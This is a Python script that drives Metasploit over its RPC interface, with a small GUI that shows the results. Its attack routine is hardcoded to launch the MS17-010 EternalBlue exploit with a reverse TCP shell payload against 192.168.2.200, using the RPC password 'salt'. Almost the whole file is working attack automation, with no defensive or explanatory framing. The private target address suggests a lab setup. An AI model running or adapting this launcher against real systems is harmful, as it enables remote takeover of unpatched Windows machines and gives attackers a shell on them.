import queue
import threading

import PySimpleGUI as sg
from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PostModule, EncoderModule, AuxiliaryModule, NopModule, \
    PayloadModule

from lib import *

FONT = ("JetBrains Mono", 13)
output_queue = queue.Queue()
input_queue = queue.Queue()


class Attack:
    __rpc: MsfRpcClient
    __rhost: str
    __module_path: Modules
    __payload: Payloads
    __module: ExploitModule | PostModule | EncoderModule | AuxiliaryModule | NopModule | PayloadModule

    def __init__(self, rpc: MsfRpcClient, rhost: str, module: Modules = None, payload: Payloads = None):
        self.__rpc = rpc
        self.__rhost = rhost
        self.__module_path = module
        self.__payload = payload

    def setModule(self, module: Modules):
        self.__module_path = module

    def setPayload(self, payload: Payloads):
        self.__payload = payload

    def run(self):
        first_slash_index = self.__module_path.value.find('/')
        mtype = self.__module_path.value[:first_slash_index]
        mname = self.__module_path.value[first_slash_index + 1:]
        self.__module = self.__rpc.modules.use(mtype, mname)
        self.__module['RHOSTS'] = self.__rhost
        self.__module.payload_generate()
        output = self.__rpc.consoles.console(self.__rpc.consoles.console().cid).run_module_with_output(
            self.__module, PayloadModule(self.__rpc, self.__payload.value))
        output_queue.put(output)


def attack_thread():
    client = MsfRpcClient("salt", port=55553, ssl=True)
    atk = Attack(client, '192.168.2.200')
    atk.setModule(Modules.MS17_010_ETERNALBLUE)
    atk.setPayload(Payloads.REVERSE_TCP)
    atk.run()


def gui_thread():
    sg.theme("DarkBlue3")
    # 定義視窗佈局
    layout = [
        [sg.Multiline(size=(80, 18), font=FONT, disabled=True, key='-OUTPUT-', autoscroll=True, expand_x=True,
                      expand_y=True)],
        [sg.Multiline(size=(80, 2), font=FONT, key='-INPUT-', enable_events=True, autoscroll=True, do_not_clear=False,
                      expand_x=True)]
    ]

    # 創建窗口
    window = sg.Window('Python GUI', layout, return_keyboard_events=True, resizable=True, finalize=True)
    window['-INPUT-'].bind("<Return>", "_Enter")

    while True:
        event, values = window.read(timeout=100)
        print(event)
        print(values)
        if event == sg.WINDOW_CLOSED:
            break

        if event == "-INPUT-" + "_Enter":  # 如果使用者按下 Enter 鍵
            # 獲取輸入框的內容並更新輸出框
            user_input = values['-INPUT-'].strip()
            if user_input == '':
                continue
            window['-OUTPUT-'].update(user_input + '\n', append=True)

            # 清空輸入框
            window['-INPUT-'].update('')

        try:
            attack_output = output_queue.get_nowait()
            window['-OUTPUT-'].update(attack_output, append=True)
            input_queue.put(attack_output)
        except queue.Empty:
            pass

    window.close()


def main():
    t1 = threading.Thread(target=attack_thread)

    t1.start()
    gui_thread()
    t1.join()


if __name__ == "__main__":
    main()
